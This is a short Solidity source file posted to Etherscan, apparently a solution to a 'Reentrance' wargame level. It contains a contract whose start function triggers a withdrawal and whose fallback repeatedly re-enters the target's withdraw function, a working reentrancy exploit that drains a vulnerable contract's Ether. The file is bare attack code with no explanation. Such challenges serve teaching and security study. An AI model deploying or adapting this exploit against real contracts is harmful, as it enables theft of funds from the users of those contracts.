/**
 *Submitted for verification at Etherscan.io on 2021-06-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Reentrance {
    function withdraw(uint) public {}
}

contract ReentranceSolution {
    function start(address a, uint amount) public {
        Reentrance r = Reentrance(a);
        r.withdraw(amount);
    }
    
    fallback() external payable {
        if (msg.sender.balance > 0) {
            Reentrance r = Reentrance(msg.sender);
            r.withdraw(msg.value);
        }
    }
}